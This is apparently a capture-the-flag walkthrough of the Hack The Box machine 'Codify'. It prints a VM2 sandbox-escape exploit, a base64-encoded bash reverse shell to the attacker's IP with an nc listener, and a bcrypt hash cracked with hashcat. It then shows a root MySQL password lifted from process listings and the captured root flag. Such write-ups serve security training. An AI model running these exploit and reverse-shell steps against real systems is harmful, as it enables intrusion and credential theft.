Initial enumeration:

http://codify.htb/about -> Explains that it uses VM2 in a sandbox
http://codify.htb/editor -> Allows you to submit nodejs code to "test"

VM2 has an exploit: https://security.snyk.io/vuln/SNYK-JS-VM2-5537100

in there, I used the following code to a responsive shell
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("ls -latr").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); // -> hacked

in the .execSync("") function, I setup a base64 encode to bypass URL security

bash -i >& /dev/tcp/ip address/4444 0>&1 -> base64 encoded -> YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41OS80NDQ0IDA+JjE=
Then ship the payload using .execSync("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41OS80NDQ0IDA+JjE= | base64 -d | bash")

with a listener "nc -lvnp 4444"
kali:~$ nc -lvnp 4444
listening on [any] 4444 ...

connect to [10.10.14.59] from (UNKNOWN) [10.10.11.239] 52798
bash: cannot set terminal process group (1270): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$ 

in /var/www/html/contact there's a sqlite3 .db file.
sqlite> .tables 
.tables
tickets  users  
sqlite> .users
.users
sqlite> SELECT * from users;
SELECT * from users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

Then using a hash identifier, it's bcrypt.
Cracked the hash via hashcat -m 3200 <rock you word list>

$ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
                                                                                                                                                                                                            OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]                                                                                                                                                                                 
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz, 6820/13704 MB (2048 MB allocatable), 8MCU                                                                                                                                
                                                                                                                                                                                                                                            
Minimum password length supported by kernel: 0                                                                                                                                                                                              
Maximum password length supported by kernel: 72                                                                                                                                                                                             
                                                                                                                                                                                                                                            
Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates                                                                                                                                                                
Rules: 1                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
Optimizers applied:                                                                                                                                                                                                                         
* Zero-Byte                                                                                                                                                                                                                                 
* Single-Hash                                                                                                                                                                                                                               
* Single-Salt                                                                                                                                                                                                                               
                                                                                                                                                                                                                                            
Watchdog: Temperature abort trigger set to 90c                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLH.../p/Zw2
Time.Started.....: Fri May  3 19:28:38 2024 (1 min, 6 secs)
Time.Estimated...: Fri May  3 19:29:44 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       21 H/s (11.97ms) @ Accel:8 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1408/14344385 (0.01%)
Rejected.........: 0/1408 (0.00%)
Restore.Point....: 1344/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4080-4096
Candidate.Engine.: Device Generator
Candidates.#1....: teacher -> tagged
Hardware.Mon.#1..: Temp: 48c Util: 92%

Started: Fri May  3 19:28:33 2024
Stopped: Fri May  3 19:29:46 2024

Password found: spongebob1
This allows me to SSH into the box as joshua
ssh joshua@10.10.11.239

Priv Escalation Enumeration

sudo -l shows that /opt/scripts/mysql-backup.sh is being run as root privilege

Looking at the script, it is susceptible to SQL injection for the root password.
The password is then sent off the mysqldump which is located in /root/.creds file.
This means that, if we can monitor the PID AS mysql-backup.sh is being run, we should be able to see the password be sent off in the PID since it's catting from the .creds file

Using pspy, we execute this to snoop the PID then run the backupsql.sh

2024/05/03 23:49:22 CMD: UID=0    PID=21396  | /bin/bash /opt/scripts/mysql-backup.sh 
2024/05/03 23:49:22 CMD: UID=1000 PID=21395  | sudo /opt/scripts/mysql-backup.sh 
2024/05/03 23:49:24 CMD: UID=0    PID=21398  | /bin/bash /opt/scripts/mysql-backup.sh 
2024/05/03 23:49:24 CMD: UID=0    PID=21403  | /usr/bin/grep -Ev (Database|information_schema|performance_schema) 
2024/05/03 23:49:24 CMD: UID=0    PID=21402  | /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 -e SHOW DATABASES; 
2024/05/03 23:49:24 CMD: UID=0    PID=21401  | /bin/bash /opt/scripts/mysql-backup.sh 
2024/05/03 23:49:24 CMD: UID=0    PID=21406  | /bin/bash /opt/scripts/mysql-backup.sh 
2024/05/03 23:49:24 CMD: UID=0    PID=21405  | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 mysql 
2024/05/03 23:49:24 CMD: UID=0    PID=21409  | /bin/bash /opt/scripts/mysql-backup.sh 
2024/05/03 23:49:24 CMD: UID=0    PID=21408  | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 sys 
2024/05/03 23:49:46 CMD: UID=1000 PID=21415  | 
2024/05/03 23:49:46 CMD: UID=0    PID=21416  | 
2024/05/03 23:49:51 CMD: UID=0    PID=21417  | 

Then using kljh12k3jhaskjh12kjh3 as the password

joshua@codify:~$ su -
Password: 
root@codify:~# ls
root.txt  scripts
root@codify:~# cat root.txt
a24ce1966e756ce7fe0758e20118f9ce

